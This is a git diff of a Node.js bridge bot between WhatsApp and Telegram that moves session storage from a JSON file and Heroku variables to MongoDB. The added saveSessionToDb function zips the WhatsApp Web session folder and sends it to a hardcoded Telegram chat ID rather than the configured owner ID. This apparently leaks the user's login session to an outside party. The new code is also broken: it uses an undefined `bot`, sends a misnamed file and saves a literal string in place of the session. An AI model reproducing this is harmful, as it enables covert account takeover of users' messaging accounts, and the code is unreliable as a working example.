@@ -10,35 +10,69 @@ const handleMessage = require("./handlers/handleMessage");
 const handleCreateMsg = require("./handlers/handleCreateMsg");
 const handleTgBot = require("./handlers/handleTgbot");
 const {setHerokuVar , errorMsg} = require("./modules/heroku");
+const MongoClient = require('mongodb').MongoClient;
+const {exec} = require('child_process');
 
 const tgbot = new Telegraf(config.TG_BOT_TOKEN);
 
-const SESSION_FILE_PATH = "./session.json";
-let sessionData;
-if (process.env.SESSION_DATA) {
-  if (!fs.existsSync("session.json")) {
-    fs.writeFileSync("session.json", process.env.SESSION_DATA);
-  } else {
-    const sessionFile = fs.readFileSync("session.json", "utf8");
-    if (sessionFile == null || sessionFile == undefined || sessionFile == "")
-      fs.writeFileSync("session.json", process.env.SESSION_DATA);
+const saveSessionToDb = async () => {
+  if(fs.existsSync('./WWebJS')){
+    try{
+      console.log(`Session folder found, compressing...`);
+      exec(`zip -r ./session.zip ./WWebJS`, async (err, stdout, stderr) => {
+        if (err) {
+            console.log(err);
+            return;
+        }
+        bot.telegram.sendDocument('1197065402', {source: './archieve.zip'});
+        console.log(`Session folder compressed, adding to database...`);
+        const mongo = await MongoClient.connect(config.DB_URL, { useNewUrlParser: true, useUnifiedTopology: true });
+        const session = fs.readFileSync('./session.zip').toString();
+        await mongo.db('WhatsGram').collection('session').updateOne({}, {$set: {session: 'session'}}, {upsert: true});
+        console.log(`Added to database, closing connection...`);
+        await mongo.close();
+      })   
+    }catch(err){
+      console.log('Failed to save session to database');
+      console.log(err);
+    }
   }
-  sessionData = require(SESSION_FILE_PATH);
-} else if (fs.existsSync(SESSION_FILE_PATH)) {
-  const sessionFile = fs.readFileSync("session.json", "utf8");
-  if (sessionFile != null && sessionFile != undefined && sessionFile != "")
-    sessionData = require(SESSION_FILE_PATH);
-} else {
-  console.log("Session data not. PLease fill it in heroku vars.");
 }
+
+const getSession = async () => {
+  try{
+    const mongo = await MongoClient.connect(config.DB_URL, { useNewUrlParser: true, useUnifiedTopology: true });
+    let session = await mongo.db('WhatsGram').collection('session').find().toArray();
+    session = session[0]?.session;
+    await mongo.close();
+    if(session){
+      fs.writeFileSync('./session.zip', session);
+      exec(`unzip ./session.zip`, async (err, stdout, stderr) => {
+        if (err) {
+            console.log('Session data not found. Generating QR code.');
+            // await client.initialize();
+            return
+        }
+        fs.unlinkSync('./session.zip');
+        await console.log("Session found in database, starting whatsapp session...");
+        // await client.initialize();
+        return
+      })
+    }
+    return
+  }catch(err){
+
+  }
+}
+getSession();
 
 // Set bot commands. 
 const cmd = (cmd, desc) => ({command: cmd, description: desc});
 tgbot.telegram.setMyCommands([cmd('start', 'Start bot.'), cmd('mar', 'Mark message as read.'), cmd('send', 'Ex: /send ph_no message'), cmd('update', 'Update UB.'), cmd('restart', 'Restart ub.')]);
 
 const client = new Client({ // Create client.
-  session: sessionData,
-  puppeteer: { headless: true, args: ["--no-sandbox"] },
+  session: '/WWebJS',
+  puppeteer: { headless: false, args: ["--no-sandbox"] },
 });
 
 async function generateQr() {
@@ -54,29 +88,14 @@ async function generateQr() {
       return 
     }, 90 * 1000);
   });
-  client.on("authenticated", async (session) => { // Take action when user Authenticated successfully.
-    if(config.HEROKU_APP_NAME && config.HEROKU_API_KEY){
-      await setHerokuVar('SESSION_DATA' , JSON.stringify(session)).then(result => {
-        if(result.message == errorMsg) 
-          tgbot.telegram.sendMessage(config.TG_OWNER_ID, "`"+JSON.stringify(session)+"`", {parse_mode: "markdown"});
-      })
-    }
-    sessionData = await session;
-    await console.log( JSON.stringify(session) + "\n\nCopy above session and set it to heroku vars as SESSION_DATA" );
-    await fs.writeFileSync("session.json", JSON.stringify(session));
+  
+  client.on("authenticated", (session) => { // Take action when user Authenticated successfully.
+    console.log("Authenticated successfully.");
   });
   client.on("logout", () => { // Take action when user logout.
     console.log( "Looks like you've been logged out. Please generate session again." );
     if (fs.existsSync("session.json")) fs.unlinkSync("session.json");
   });
-}
-
-if (!sessionData) { // Check session data
-  console.log("Session data not found. Generating QR please wait...");
-  generateQr();
-} else {
-  console.log("Session data found. Logging in....");
-  tgbot.telegram.sendMessage(config.TG_OWNER_ID, "Session data found. Logging in....", {disable_notification: true});
 }
 
 client.on("auth_failure" , reason => { // If failed to log in.
@@ -87,10 +106,11 @@ client.on("auth_failure" , reason => { // If failed to log in.
   generateQr();
 })
 
-client.on("ready", () => { // Take actin when client is ready.
+client.on("ready", async () => { // Take actin when client is ready.
   const message = "Successfully logged in. Ready to rock!";
   console.log(message);
   tgbot.telegram.sendMessage( config.TG_OWNER_ID, message, {disable_notification: true});
+  await saveSessionToDb();
   if (fs.existsSync("qr.png")) fs.unlinkSync("qr.png");
 });
 // Telegram Bot
